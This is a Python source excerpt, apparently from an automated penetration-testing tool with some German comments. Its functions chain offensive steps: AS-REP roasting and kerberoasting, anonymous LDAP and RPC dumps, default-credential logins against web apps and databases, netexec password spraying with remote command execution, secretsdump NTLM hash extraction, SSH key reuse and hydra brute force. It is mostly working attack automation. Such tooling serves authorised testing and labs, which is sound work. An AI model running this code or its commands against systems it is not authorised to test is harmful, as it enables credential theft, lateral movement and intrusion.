
def nuclei_scan(ip, port, scheme, host, tag):
    if not have("nuclei"):
        dbg("nuclei missing", tag); return
    target = f"{scheme}://{host or ip}:{port}/"
    info(f"nuclei {target}", tag)
    _, o = run_live(["nuclei","-u",target,"-silent","-nc",
                     "-severity","medium,high,critical"],
                    t=tag, timeout=T_GOBUSTER, echo=False)
    for line in o.splitlines():
        line = line.strip()
        if line.startswith("["):
            finding("NUCLEI", line[:180], tag)

_CMS_KW = ("wordpress","joomla","drupal","tomcat","jenkins","phpmyadmin","grafana",
           "gitlab","nagios","zabbix","magento","laravel","django","adminer")
def web_fingerprint(base, tag):
    """whatweb/httpx -> erkannte Technologien/CMS (set)."""
    apps, o = set(), ""
    if have("whatweb"):
        _, o = run(["whatweb","-a","3","--no-errors","--color=never", base], timeout=T_GENERIC)
    elif have("httpx"):
        _, o = run(["httpx","-u",base,"-td","-title","-server","-silent","-nc"], timeout=T_GENERIC)
    else:
        dbg("whatweb/httpx missing, skip fingerprint", tag); return apps
    low = o.lower()
    for kw in _CMS_KW:
        if kw in low: apps.add(kw)
    if o.strip():
        finding("WEB", f"fingerprint {base}: "+", ".join(sorted(apps)) if apps
                else f"fingerprint {base}: "+o.strip().splitlines()[0][:140], tag)
    # Gezielte CMS-Scanner
    if "wordpress" in apps and have("wpscan"):
        info(f"wpscan {base}", tag)
        _, w = run_live(["wpscan","--url",base,"--no-banner","--random-user-agent",
                         "-e","vp,u","--format","cli-no-color"],
                        t=tag, timeout=T_GOBUSTER, echo=False)
        for u in sorted(set(re.findall(r"(?i)\[\+\]\s+([A-Za-z0-9._\-]+)\s*$", w, re.M)))[:20]:
            finding("WEB", f"wp user: {u}", tag)
    elif "drupal" in apps and have("droopescan"):
        run_live(["droopescan","scan","drupal","-u",base], t=tag, timeout=T_GOBUSTER, echo=False)
    return apps

def web_lowhang(base, ip, port, scheme, tag):
    """robots.txt / sitemap.xml - report only NEW paths (not already via gobuster)."""
    if not have("curl"): return
    for name in ("robots.txt", "sitemap.xml"):
        _, body = run(["curl","-sk","-m","12", f"{base}/{name}"], timeout=20)
        if not body or "<html" in body[:200].lower(): continue
        if name == "robots.txt":
            paths = re.findall(r"(?im)^(?:dis)?allow:\s*(\S+)", body)
        else:
            paths = re.findall(r"<loc>\s*\S*?(/[^<\s]*)\s*</loc>", body)
        new = []
        for p in paths:
            p = p.split("?",1)[0]
            if p and p != "/" and not web_path_known(p):
                new.append(p); note_web_path(p)
        if new:
            finding("WEB", f"{name}: new paths: "+", ".join(sorted(set(new))[:15]), tag)

def web_crawl(base, out, tag):
    """katana/gau crawl -> collect endpoints (optionally as nuclei input)."""
    tool = None
    if have("katana"):   cmd = ["katana","-u",base,"-d","2","-silent","-nc"]; tool="katana"
    elif have("gau"):    cmd = ["gau","--threads","5",base];                 tool="gau"
    else:
        dbg("katana/gau missing, skip crawl", tag); return None
    info(f"crawl ({tool}) {base}", tag)
    _, o = run(cmd, timeout=T_GOBUSTER)
    urls = sorted({l.strip() for l in o.splitlines() if l.strip().startswith("http")})
    if not urls: return None
    wd = out/"files"/"web"; wd.mkdir(parents=True, exist_ok=True)
    ep = wd/f"endpoints_{re.sub(r'[^A-Za-z0-9]+','_',base).strip('_')}.txt"
    ep.write_text("\n".join(urls)+"\n")
    finding("WEB", f"crawl: {len(urls)} endpoints -> {ep}", tag)
    for u in urls:
        m = re.search(r"https?://[^/]+(/\S*)", u)
        if m: note_web_path(m.group(1).split("?",1)[0])
    return ep

def web_default_creds(base, apps, tag):
    """Default creds against recognised logins. Hit -> finding + add_cred."""
    if not have("curl"): return
    def basic_ok(path, user, pw, needle):
        _, o = run(["curl","-sk","-m","12","-o","/dev/null","-w","%{http_code}",
                    "-u",f"{user}:{pw}", f"{base}{path}"], timeout=20)
        code = (o or "").strip()[-3:]
        if code == "200":
            # Noch inhaltlich verifizieren
            _, body = run(["curl","-sk","-m","12","-u",f"{user}:{pw}", f"{base}{path}"], timeout=20)
            return needle.lower() in (body or "").lower()
        return False
    for app in apps:
        creds = WEB_DEFAULT_CREDS.get(app)
        if not creds: continue
        for user, pw in creds:
            hit = False
            if app == "tomcat":
                hit = basic_ok("/manager/html", user, pw, "Tomcat Web Application Manager")
            elif app == "grafana":
                _, o = run(["curl","-sk","-m","12","-o","/dev/null","-w","%{http_code}",
                            "-H","Content-Type: application/json","-X","POST",
                            "-d",f'{{"user":"{user}","password":"{pw}"}}', f"{base}/login"],
                           timeout=20)
                hit = (o or "").strip().endswith("200")
            else:
                # Jenkins/phpMyAdmin: generic basic-auth attempt; otherwise just a hint
                hit = basic_ok("/", user, pw, app)
            if hit:
                finding("CREDS", f"web {app} default login {user}:{pw or '<empty>'} @ {base}", tag)
                add_cred(user, pw, f"web/{app}")
                break
        else:
            dbg(f"{app}: default creds not confirmed (check manually)", tag)

def kerberos(ip, out, host):
    info("enumerate Kerberos/AD (88)", "krb")
    dom = DOMAIN or (host.split(".",1)[-1] if host and "." in host else host) or ""
    if not dom and have("nmap"):
        _, o = run(["nmap","-p389","--script","ldap-rootdse","-Pn","-n",ip], timeout=T_GENERIC)
        m = re.search(r"DC=([A-Za-z0-9\-]+),DC=([A-Za-z0-9\-]+)", o)
        if m: dom = f"{m.group(1)}.{m.group(2)}"
    if not dom:
        warn("domain unknown, set DOMAIN in config, skipping", "krb"); return
    ok(f"Domain: {dom}", "krb")
    tmp = Path(tempfile.mkdtemp(prefix="p4ckrat_krb_"))
    users = tmp/"users.txt"   # scratch list for GetNPUsers only
    try:
        if have("kerbrute") and USER_WORDLIST.exists():
            info("kerbrute userenum ...", "krb")
            _, o = run_live(["kerbrute","userenum","-d",dom,"--dc",ip,str(USER_WORDLIST)],
                            t="krb", timeout=T_GENERIC,
                            filt=lambda l: "VALID" in l or "+" in l)
            found = sorted(set(re.findall(r"VALID USERNAME:\s+([^@\s]+)", o)))
            if found:
                users.write_text("\n".join(found)+"\n")
                finding("KRB", "valid users: "+", ".join(found), "krb")
        if not users.exists() and USER_WORDLIST.exists():
            shutil.copy(USER_WORDLIST, users)
        gnp = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
        if gnp and users.exists():
            info("AS-REP Roasting (GetNPUsers) ...", "krb")
            _, o = run_live([gnp, f"{dom}/","-no-pass","-dc-ip",ip,"-usersfile",str(users)],
                            t="krb", timeout=T_GENERIC,
                            filt=lambda l: "krb5asrep" in l or "error" in l.lower())
            hashes = re.findall(r"\$krb5asrep\$\S+", o)
            if hashes:   # real loot -> create files/
                dest = out/"files"; dest.mkdir(parents=True, exist_ok=True)
                hf = dest/"asrep_hashes.txt"; hf.write_text("\n".join(hashes)+"\n")
                finding("KRB", f"AS-REP Hash -> {hf} (hashcat -m 18200)", "krb")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

def ldap_usernames(text):
    """Login names from an LDAP/LDIF dump. Uses sAMAccountName AND derives the user
    'First.Last' from 'dn: CN=First Last,OU=...' (for objects whose sAMAccountName
    wasn't returned, e.g. a restricted anonymous bind)."""
    users = set()
    for v in re.findall(r"(?im)^sAMAccountName:\s*(.+?)\s*$", text):
        if v and " " not in v:            # real login names have no spaces
            users.add(v)
    # users live in OUs; groups/builtins usually in CN=Users -> ignore those
    for cn in re.findall(r"(?im)^dn:\s*CN=([^,]+),OU=", text):
        parts = cn.strip().split()
        if 2 <= len(parts) <= 3 and all(re.fullmatch(r"[A-Za-z\-']+", p) for p in parts):
            users.add(f"{parts[0]}.{parts[-1]}")   # First.Last
    return sorted(users)

def ldif_creds(text, src):
    """LDIF records (blank-line separated): map a password in the description/info
    field to the sAMAccountName/CN of the SAME entry -> precise add_cred."""
    n = 0
    for rec in re.split(r"\n\s*\n", text):
        um = re.search(r"(?im)^sAMAccountName:\s*(\S+)", rec)
        user = um.group(1) if um else None
        if not user:
            dn = re.search(r"(?im)^dn:\s*CN=([^,]+)", rec)
            user = dn.group(1).strip() if dn else None
        if not user: continue
        for fld in re.findall(r"(?im)^(?:description|info|comment):\s*(.+)$", rec):
            m = _PROSE_PW.search(fld) or _PASS_VAL.search(fld)
            if m and _looks_like_secret(m.group(1)):
                add_cred(user, m.group(1), f"ldap-desc:{src}"); n += 1
    return n

def ldap_enum(ip, out, host):
    info("enumerate LDAP (389/636)", "ldap")
    if not have("ldapsearch"):
        warn("ldapsearch missing", "ldap"); return
    # rootDSE -> naming contexts
    _, root = run(["ldapsearch","-x","-H",f"ldap://{ip}","-s","base",
                   "namingContexts"], timeout=T_GENERIC)
    ctxs = re.findall(r"(?i)namingContexts:\s*(\S+)", root)
    if ctxs:
        finding("LDAP", "naming contexts: "+", ".join(ctxs), "ldap")
    base = ctxs[0] if ctxs else (
        ",".join(f"DC={p}" for p in (DOMAIN or host or "").split(".") if p) or None)
    if not base:
        warn("no base DN (empty anonymous bind / no domain)", "ldap"); return
    info(f"anonymous bind dump ({base})", "ldap")
    _, o = run(["ldapsearch","-x","-H",f"ldap://{ip}","-b",base], timeout=T_SVCSCAN)
    if o and "ldap_bind" not in o.lower():
        dest = out/"files"; dest.mkdir(parents=True, exist_ok=True)
        f = dest/"ldap_dump.txt"; f.write_text(o, errors="replace")
        users = ldap_usernames(o)
        finding("LDAP", f"anonymous dump -> {f}"+(f" ({len(users)} users)" if users else ""), "ldap")
        if users:
            (dest/"ldap_users.txt").write_text("\n".join(users)+"\n")
        # map passwords in description/info per entry to the user
        n = ldif_creds(o, "ldap_dump")
        if n:
            finding("CREDS", f"{n} password(s) collected from LDAP descriptions", "ldap")
    else:
        warn("anonymous bind returned nothing", "ldap")

def snmp_enum(ip, out):
    info("enumerate SNMP (udp/161, community 'public')", "snmp")
    tool = "snmpwalk" if have("snmpwalk") else ("snmpbulkwalk" if have("snmpbulkwalk") else "")
    if not tool:
        warn("snmpwalk missing", "snmp"); return
    _, o = run([tool,"-v2c","-c","public","-t","3","-r","1", ip], timeout=T_SVCSCAN)
    if not o or "Timeout" in o or "No Such" in o and o.count("\n") < 3:
        warn("no SNMP response (public)", "snmp"); return
    lines = [l for l in o.splitlines() if l.strip()]
    if len(lines) < 2:
        warn("SNMP leer", "snmp"); return
    dest = out/"files"; dest.mkdir(parents=True, exist_ok=True)
    f = dest/"snmp_public.txt"; f.write_text(o, errors="replace")
    finding("SNMP", f"community 'public' readable -> {f} ({len(lines)} OIDs)", "snmp")

def nfs_enum(ip, out):
    info("enumerate NFS (111/2049)", "nfs")
    if not have("showmount"):
        warn("showmount missing", "nfs"); return
    _, o = run(["showmount","-e",ip], timeout=T_GENERIC)
    exports = re.findall(r"^(/\S+)", o, re.M)
    if not exports:
        warn("no NFS exports", "nfs"); return
    finding("NFS", "exports: "+", ".join(exports), "nfs")
    if DRY_RUN or not _POSIX or not have("mount"):
        return
    dest = out/"files"/"nfs"
    for ex in exports:
        mp = Path(tempfile.mkdtemp(prefix="p4ckrat_nfs_"))
        rc, _ = run(["mount","-o","ro,soft,nolock",f"{ip}:{ex}",str(mp)], timeout=60)
        if rc == 0 and any(mp.iterdir()):
            local = dest/ex.strip("/").replace("/","_"); local.mkdir(parents=True, exist_ok=True)
            try:
                for item in mp.rglob("*"):
                    if item.is_file() and item.stat().st_size < 5_000_000:
                        rel = item.relative_to(mp); tgt = local/rel
                        tgt.parent.mkdir(parents=True, exist_ok=True)
                        shutil.copy2(item, tgt)
                ok(f"NFS {ex} -> {local}", "nfs")
            except OSError: pass
        run(["umount",str(mp)], timeout=30)
        shutil.rmtree(mp, ignore_errors=True)

def rpc_enum(ip, out):
    info("enumerate RPC (null session)", "rpc")
    if not have("rpcclient"):
        warn("rpcclient missing", "rpc"); return
    _, o = run(["rpcclient","-U","","-N",ip,"-c","enumdomusers;enumdomgroups;querydominfo"],
               timeout=T_GENERIC)
    users = sorted(set(re.findall(r"user:\[([^\]]+)\]", o)))
    if users:
        finding("RPC", "domain users: "+", ".join(users[:40]), "rpc")
        dest = out/"files"; dest.mkdir(parents=True, exist_ok=True)
        (dest/"rpc_users.txt").write_text("\n".join(users)+"\n")
    else:
        warn("null-session rpc returned no users", "rpc")

# (service, default-user, default-pass-liste) je DB-Port
_DB_DEFAULTS = {
    "mssql":    ("sa",       ["", "sa", "Password123", "password"]),
    "mysql":    ("root",     ["", "root", "toor", "password"]),
    "postgres": ("postgres", ["", "postgres", "password"]),
}
def db_probe(ip, port, kind, out):
    info(f"probe {kind} default creds (:{port})", kind)
    user, pws = _DB_DEFAULTS[kind]
    for pw in pws:
        rc = None
        if kind == "mysql" and have("mysql"):
            # --password= (not -p) so an empty pw doesn't trigger an interactive prompt
            rc, _ = run(["mysql","-h",ip,"-u",user,f"--password={pw}",
                         "--connect-timeout=10","-e","SELECT 1"], timeout=30)
        elif kind == "postgres" and have("psql"):
            if DRY_RUN:
                _dry(["psql","-h",ip,"-U",user,"-c","SELECT 1"], kind); return
            try:
                r = subprocess.run(["psql","-h",ip,"-U",user,"-c","SELECT 1","-w"],
                                   capture_output=True, text=True, stdin=subprocess.DEVNULL,
                                   env={**os.environ,"PGPASSWORD":pw}, timeout=30)
                rc = r.returncode
            except (subprocess.TimeoutExpired, OSError):
                rc = 124
        elif kind == "mssql" and (have("impacket-mssqlclient") or have("mssqlclient.py")):
            tool = shutil.which("impacket-mssqlclient") or shutil.which("mssqlclient.py")
            rc, o = run([tool, f"{user}:{pw}@{ip}","-command","SELECT 1"], timeout=30)
            if rc == 0 and "Login failed" in (o or ""): rc = 1
        else:
            warn(f"client for {kind} missing, skipping", kind); return
        if rc == 0:
            finding("CREDS", f"{kind} default login {user}:{pw or '<empty>'}", kind)
            add_cred(user, pw, kind)
            return
    warn(f"no {kind} default creds", kind)

def redis_enum(ip, out):
    info("enumerate Redis (6379, unauth)", "redis")
    if not have("redis-cli"):
        warn("redis-cli missing", "redis"); return
    rc, o = run(["redis-cli","-h",ip,"-t","5","INFO","server"], timeout=30)
    if rc == 0 and "redis_version" in (o or ""):
        ver = re.search(r"redis_version:(\S+)", o)
        finding("REDIS", f"unauthenticated access (v{ver.group(1) if ver else '?'})", "redis")
        _, keys = run(["redis-cli","-h",ip,"-t","5","KEYS","*"], timeout=30)
        klist = [k for k in (keys or "").splitlines() if k.strip()][:20]
        if klist:
            finding("REDIS", "keys: "+", ".join(klist), "redis")
    elif "NOAUTH" in (o or ""):
        warn("redis requires auth", "redis")
    else:
        warn("no redis response", "redis")

def rsync_enum(ip, out):
    info("enumerate rsync (873, anon modules)", "rsync")
    if not have("rsync"):
        warn("rsync missing", "rsync"); return
    _, o = run(["rsync","--list-only","--timeout","15",f"rsync://{ip}/"], timeout=T_GENERIC)
    mods = [m.group(1) for m in re.finditer(r"^(\S+)\s+", o, re.M)
            if not m.group(1).startswith("@")]
    if mods:
        finding("RSYNC", "modules: "+", ".join(mods), "rsync")
    else:
        warn("no anonymous rsync modules", "rsync")

def _domain_for(host):
    return DOMAIN or (host.split(".",1)[-1] if host and "." in host else "") or ""

def _base_dn(dom):
    return ",".join(f"DC={p}" for p in dom.split(".") if p) if dom else ""

def kerberoast(ip, user, secret, kind, dom, out):
    """GetUserSPNs after a found cred -> TGS hashes (hashcat -m 13100)."""
    gnp = shutil.which("impacket-GetUserSPNs") or shutil.which("GetUserSPNs.py")
    if not (gnp and dom): return
    info(f"kerberoast (GetUserSPNs) as {user}", "krb")
    cmd = [gnp, f"{dom}/{user}:{secret}","-dc-ip",ip,"-request"] if kind == "pw" \
          else [gnp, f"{dom}/{user}","-hashes",f":{secret}","-dc-ip",ip,"-request"]
    _, o = run(cmd, timeout=T_GENERIC)
    hashes = re.findall(r"\$krb5tgs\$\S+", o)
    if hashes:
        dest = out/"files"; dest.mkdir(parents=True, exist_ok=True)
        hf = dest/"kerberoast_hashes.txt"; hf.write_text("\n".join(hashes)+"\n")
        finding("KRB", f"{len(hashes)} TGS -> {hf} (hashcat -m 13100)", "krb")

def ldap_creds(ip, user, secret, kind, dom, out):
    """Authenticated LDAP dump: search user descriptions for passwords."""
    if kind != "pw" or not have("ldapsearch") or not dom: return
    base = _base_dn(dom)
    if not base: return
    info(f"ldap description-grep as {user}", "ldap")
    _, o = run(["ldapsearch","-x","-H",f"ldap://{ip}","-D",f"{user}@{dom}","-w",secret,
                "-b",base,"(objectClass=user)","sAMAccountName","description","info"],
               timeout=T_SVCSCAN)
    if not o or "ldap_bind" in o.lower(): return
    descs = re.findall(r"(?im)^(?:description|info):\s*(.+)$", o)
    hit = [d for d in descs if re.search(r"(?i)pw|pass|cred|secret|\d{3,}", d)]
    if hit:
        dest = out/"files"; dest.mkdir(parents=True, exist_ok=True)
        (dest/"ldap_descriptions.txt").write_text("\n".join(descs)+"\n")
        for d in hit[:10]:
            finding("LDAP", f"description: {d.strip()[:140]}", "ldap")
    ldif_creds(o, "ldap_auth")   # map passwords to their respective user

def secretsdump(ip, user, secret, kind, dom, out):
    """On admin access: secretsdump (ONLY with --secretsdump)."""
    if not DO_SECRETS: return
    sd = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
    if not sd: return
    tgt = f"{dom}/{user}" if dom else user
    cmd = [sd, f"{tgt}:{secret}@{ip}"] if kind == "pw" else [sd, f"{tgt}@{ip}","-hashes",f":{secret}"]
    info(f"secretsdump as {user}", "dump")
    _, o = run(cmd, timeout=T_SVCSCAN)
    hashes = re.findall(r"^\S+:\d+:[a-f0-9]{32}:[a-f0-9]{32}:::", o, re.M)
    if hashes:
        dest = out/"files"; dest.mkdir(parents=True, exist_ok=True)
        hf = dest/"secretsdump.txt"; hf.write_text(o, errors="replace")
        finding("DUMP", f"{len(hashes)} NTLM hashes -> {hf}", "dump")
        for h in hashes:
            u = h.split(":",1)[0]; nt = h.split(":")[3]
            add_cred(u, nt, "secretsdump", kind="hash")

def _spray_targets(out):
    """Candidate users for password-without-user hits: from enum user lists + pool."""
    users = set()
    fd = out/"files"
    if fd.exists():
        for name in ("smb_users.txt","nxc_users.txt","rpc_users.txt","ldap_users.txt"):
            fp = fd/name
            if fp.exists():
                users.update(l.strip() for l in fp.read_text(errors="replace").splitlines() if l.strip())
    with _CREDS_LOCK:
        users.update(c["user"] for c in _CREDS if c["user"] != "__PW_ONLY__")
    return sorted(u for u in users if u)

# netexec hits that count as "valid" even though nxc prefixes them with [-]:
# the password is correct, only a login/change policy blocks the session.
_NXC_VALID_STATUS = ("STATUS_PASSWORD_MUST_CHANGE","STATUS_PASSWORD_EXPIRED",
                     "STATUS_LOGON_TYPE_NOT_GRANTED","STATUS_ACCOUNT_RESTRICTION")
_NXC_PROTOS = r"SMB|LDAP|WINRM|RDP|SSH|FTP|WMI|MSSQL"

def _parse_nxc(o):
    """netexec output -> list of dict(user, status, admin). Valid = [+] OR
    must-change/restricted. Lenient + ANSI-stripped (nxc may colorize)."""
    o = _ANSI.sub("", o or "")
    hits = []
    for line in o.splitlines():
        if not re.match(rf"\s*(?:{_NXC_PROTOS})\b", line, re.I):
            continue
        sm = re.search(r"STATUS_[A-Z_]+", line)
        status = sm.group(0) if sm else ""
        admin = "(Pwn3d!)" in line
        if not (("[+]" in line) or (status in _NXC_VALID_STATUS)):
            continue
        # grab the 'domain\user:pass' (or 'user:pass') token after the [+]/[-] marker
        m = re.search(r"\[[+\-]\]\s+(\S+)", line)
        if not m:
            continue
        up = m.group(1).split("\\", 1)[-1]        # dom\user:pass -> user:pass
        user = up.split(":", 1)[0]
        if user:
            hits.append({"user": user, "status": status, "admin": admin})
    return hits

def _ad_protos(svcmap):
    protos = []
    if "389" in svcmap or "636" in svcmap or "3268" in svcmap: protos.append("ldap")
    if "445" in svcmap or "139" in svcmap: protos.append("smb")
    if "5985" in svcmap or "5986" in svcmap: protos.append("winrm")
    return protos

def _nxc_connected(o):
    """True if nxc actually spoke the protocol (produced a banner line)."""
    o = _ANSI.sub("", o or "")
    return bool(re.search(rf"(?im)^\s*(?:{_NXC_PROTOS})\s+\S+\s+\d+\s", o))

def _nxc_call(nxc, proto, targets, authargs, timeout):
    """Run nxc, trying targets in order (FQDN/domain first, IP last). LDAP against a
    signing-required DC fails by IP, so the hostname is what makes must-change show up.
    Returns (output, hits, used_target)."""
    last = ""
    for tgt in targets:
        _, o = run([nxc, proto, tgt, *authargs], timeout=timeout)
        last = o
        hits = _parse_nxc(o)
        if hits:
            return o, hits, tgt
        # protocol lines but no valid login -> a genuine miss, don't retry other targets
        if _nxc_connected(o):
            return o, [], tgt
        # no protocol lines at all -> connection/resolve failure, try the next target
    return last, [], (targets[-1] if targets else "")

_SPRAYED_BATCH = set()   # (proto, secret, kind) - broad-spray dedup (2nd round)
_SPRAYED_NAMED = set()   # (user, secret, kind)   - SSH/FTP dedup
_POST_CRED_DONE = set()  # (user, secret, kind)   - post-auth AD steps run once per cred

def spray_creds(ip, svcmap, out, host=""):
    """Pivot spray. Core idea: spray EVERY found password against ALL known users
    (solves 'password sits in another user's description'); must-change counts as a hit."""
    if not DO_SPRAY: return
    with _CREDS_LOCK:
        pool = list(_CREDS)
    if not pool: return
    names = {n for n,_ in svcmap.values()}
    has = lambda port, kw: port in svcmap or any(kw in n for n in names)
    dom = _domain_for(host)
    nxc = _nxc()
    protos = _ad_protos(svcmap)
    cand_users = _spray_targets(out)
    _hdr = [False]
    def _head():
        if not _hdr[0]: head("CREDENTIAL-SPRAY (PIVOT)"); _hdr[0] = True

    # --- broad spray via netexec: each distinct secret x all users, one call per proto ---
    if nxc and protos and cand_users and not DRY_RUN:
        secrets = {}
        for c in pool:
            secrets.setdefault((c["secret"], c["kind"]), c["source"])
        dflag = ["-d", dom] if dom else []   # tell netexec the AD domain
        # FQDN/domain first (LDAP by IP fails on signing-required DCs), IP as fallback
        targets = [t for t in dict.fromkeys([host, dom, ip]) if t]
        tmp = Path(tempfile.mkdtemp(prefix="p4ckrat_spray_"))
        uf = tmp/"users.txt"; uf.write_text("\n".join(cand_users)+"\n")
        try:
            for (secret, kind), src in secrets.items():
                shown = secret if kind == "pw" else secret[:12]+"..(NT)"
                for proto in protos:
                    if (proto, secret, kind) in _SPRAYED_BATCH: continue
                    _SPRAYED_BATCH.add((proto, secret, kind))
                    _head()
                    info(f"nxc {proto}: '{shown}' x {len(cand_users)} users -> {targets[0]}"
                         + (f" (-d {dom})" if dom else ""), "spray")
                    auth = ["-u",str(uf), ("-H" if kind=="hash" else "-p"),secret,
                            "--continue-on-success", *dflag]
                    o, hits, tgt = _nxc_call(nxc, proto, targets, auth, T_SVCSCAN)
                    for h in hits:
                        u, status, admin = h["user"], h["status"], h["admin"]
                        base = f"{proto.upper()} {u}:{shown}"
                        if status:
                            finding("PIVOT", f"{base}  [{status}] (valid, from {src})", "spray")
                        else:
                            finding("PIVOT", f"{base}{' ADMIN' if admin else ''} (from {src})", "spray")
                        add_cred(u, secret, f"spray/{proto}", kind=kind, announce=False)  # remember real user
                        # A cleanly usable cred ([+], no blocking STATUS) enables
                        # authenticated AD enum for ANY user - kerberoast and the LDAP
                        # description grep need only a valid account, not an admin.
                        # (must-change/expired/restricted creds can't bind -> skipped.)
                        usable = not status
                        if usable and (u, secret, kind) not in _POST_CRED_DONE:
                            _POST_CRED_DONE.add((u, secret, kind))
                            kerberoast(ip, u, secret, kind, dom, out)
                            ldap_creds(ip, u, secret, kind, dom, out)
                            if proto == "smb":
                                # authenticated user/share enum -> feeds round-2 spray
                                nxc_smb_enum(ip, out, u, secret, kind)
                        if admin and proto == "smb":
                            _, w = run([nxc,"smb",tgt,"-u",u,("-H" if kind=="hash" else "-p"),
                                        secret,"-x","whoami", *dflag], timeout=40)
                            for ln in re.findall(r"(?i)\b\S+\\\S+", w)[:1]:
                                raw("shell "+ln, "spray")
                            secretsdump(ip, u, secret, kind, dom, out)
                    if not hits:
                        clean = _ANSI.sub("", o or "")
                        if not _nxc_connected(clean):
                            info("  nxc could not reach the service (connection/resolve)", "spray")
                        else:
                            info("  no valid logins", "spray")
                        # always show a sample line so a miss is diagnosable
                        sample = next((l.strip() for l in clean.splitlines()
                                       if re.match(rf"\s*(?:{_NXC_PROTOS})\b", l, re.I)
                                       and ("[-]" in l or "[+]" in l)), "")
                        if sample: raw(sample[:180], "spray")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
    elif protos and not nxc:
        warn("netexec/nxc missing - AD spray skipped (SSH/FTP only)", "spray")

    # --- named-cred spray for SSH/FTP (user known, plaintext) ---
    for c in [c for c in pool if c["user"] != "__PW_ONLY__" and c["kind"] == "pw"]:
        user, secret, src = c["user"], c["secret"], c["source"]
        if (user, secret, "pw") in _SPRAYED_NAMED: continue
        _SPRAYED_NAMED.add((user, secret, "pw"))
        label = f"{user}:{secret}"
        if has("22","ssh") and have("sshpass") and not DRY_RUN:
            _head()
            rc, o = run(["sshpass","-p",secret,"ssh","-o","StrictHostKeyChecking=no",
                         "-o","ConnectTimeout=8","-o","PreferredAuthentications=password",
                         f"{user}@{ip}","id; hostname"], timeout=30)
            if rc == 0 and "uid=" in (o or ""):
                finding("PIVOT", f"SSH {label} (from {src})", "spray")
                for ln in (o or "").splitlines():
                    if ln.strip(): raw("shell "+ln.strip(), "spray")
        if has("21","ftp") and not DRY_RUN:
            try:
                ftp = ftplib.FTP(); ftp.connect(ip,21,timeout=10)
                ftp.login(user, secret); ftp.quit()
                _head(); finding("PIVOT", f"FTP {label} (from {src})", "spray")
            except Exception:
                pass

def ssh_key_loot(ip, out, svcmap, host=""):
    """Test found private SSH keys against the SSH service."""
    if not ("22" in svcmap or any("ssh" in n for n,_ in svcmap.values())): return
    if not have("ssh"): return
    root = out/"files"
    if not root.exists(): return
    keys = []
    for f in root.rglob("*"):
        if not f.is_file() or f.suffix.lower() in SKIP_EXT: continue
        try:
            if f.stat().st_size > 20000: continue
            head_txt = f.read_text(errors="replace")[:60]
        except OSError:
            continue
        if "PRIVATE KEY-----" in head_txt:
            keys.append(f)
    if not keys: return
    head("SSH-KEY-LOOT")
    users = _spray_targets(out) or []
    users = list(dict.fromkeys(users + ["root"]))
    finding("LOOT", f"{len(keys)} private key(s), testing against ssh ({len(users)} users)", "ssh")
    for key in keys:
        if _POSIX and not DRY_RUN:
            try: os.chmod(key, 0o600)
            except OSError: pass
        for user in users:
            rc, o = run(["ssh","-i",str(key),"-o","StrictHostKeyChecking=no",
                         "-o","BatchMode=yes","-o","ConnectTimeout=8",
                         f"{user}@{ip}","id; hostname"], timeout=25)
            if rc == 0 and "uid=" in (o or ""):
                finding("PIVOT", f"SSH key {key.name} -> {user}@{ip}", "ssh")
                for ln in (o or "").splitlines():
                    if ln.strip(): raw("shell "+ln.strip(), "ssh")
                break

_EDB_ROOT = "/usr/share/exploitdb/exploits"
_EDB_PATH = re.compile(r"[\w.+\-/]+/\d+\.\w+$")   # real exploit path ends in <edb-id>.<ext>

def _searchsploit(query):
    """-> list of (title, absolute_path). Prefer JSON; fall back to the text table.
    Strictly filters so searchsploit's own usage/help text can't leak in as results."""
    results = []
    # 1) JSON mode (gives absolute Path) - only trust it if it actually parses as JSON
    rc, o = run(["searchsploit","-j", *query.split()], timeout=60)
    if o and o.lstrip().startswith("{"):
        try:
            data = _json.loads(o)
            for r in data.get("RESULTS_EXPLOIT", []):
                title, path = r.get("Title","").strip(), r.get("Path","").strip()
                if title and _EDB_PATH.search(path):
                    results.append((title, path))
            return results
        except ValueError:
            pass
    # 2) Text table "Title | category/.../<edb-id>.<ext>"
    rc, o = run(["searchsploit","--disable-colour", *query.split()], timeout=60)
    for line in (o or "").splitlines():
        if "|" not in line or "----" in line or "Exploit Title" in line:
            continue
        title, _, path = line.rpartition("|")
        title, path = title.strip(), path.strip()
        if not _EDB_PATH.search(path):     # skip usage/help junk
            continue
        if not path.startswith("/"):
            path = f"{_EDB_ROOT}/{path}"
        results.append((title, path))
    return results

def searchsploit_scan(svcmap):
    """Match nmap version banners against searchsploit -> possible exploits + path."""
    if not have("searchsploit"): return
    head("SEARCHSPLOIT")
    seen = set()
    for port in sorted(svcmap, key=int):
        name, extra = svcmap[port]
        # pull product + version from the -sCV extra field
        m = re.search(r"([A-Za-z][A-Za-z0-9 _+\-]+?)\s+(\d+(?:\.\d+)+)", extra or "")
        if not m:
            continue
        query = f"{m.group(1).strip()} {m.group(2)}"
        if query.lower() in seen: continue
        seen.add(query.lower())
        hits = _searchsploit(query)
        if hits:
            finding("EXPLOIT", f"{query}: {len(hits)} hit(s) (searchsploit)", "sploit")
            for title, path in hits[:6]:
                raw(f"{title[:90]}  ->  {path}", "sploit")

def hydra_prompt(ip, svcmap, out):
    svcs = []
    if "22" in svcmap or any("ssh" in n for n,_ in svcmap.values()): svcs.append(("ssh","22"))
    if "21" in svcmap or any("ftp" in n for n,_ in svcmap.values()): svcs.append(("ftp","21"))
    if not (svcs and have("hydra")):
        if svcs and not have("hydra"): warn("hydra not installed, skipping brute")
        return
    ulist = str(USER_WORDLIST)
    emit()
    if not ask(f"run hydra against {', '.join(s for s,_ in svcs)}? "
               +col("d",f"({Path(ulist).name} x {PASS_WORDLIST.name})"), default="n"):
        info("hydra skipped"); return
    if not (Path(ulist).exists() and PASS_WORDLIST.exists()):
        warn("user/pass list missing"); return
    for name, port in svcs:
        head(f"HYDRA {name}")
        _, o = run_live(["hydra","-L",ulist,"-P",str(PASS_WORDLIST),"-t","4","-f","-I",
                  f"{name}://{ip}"],
                 t="hydra", timeout=T_HYDRA, filt=lambda l: "login:" in l or "valid" in l.lower())
        for m in re.finditer(r"login:\s*(\S+)\s+password:\s*(\S+)", o):
            finding("CREDS", f"{name}  {m.group(1)}:{m.group(2)}", "hydra")
            add_cred(m.group(1), m.group(2), f"hydra/{name}")

def ask(q, default="n"):
    try:
        a = input(col("Y","[?] ")+q+col("d",f" [{'Y/n' if default=='y' else 'y/N'}] ")).strip().lower()
    except EOFError:
        a = ""
    return (a or default) == "y"

def parse_args(argv):
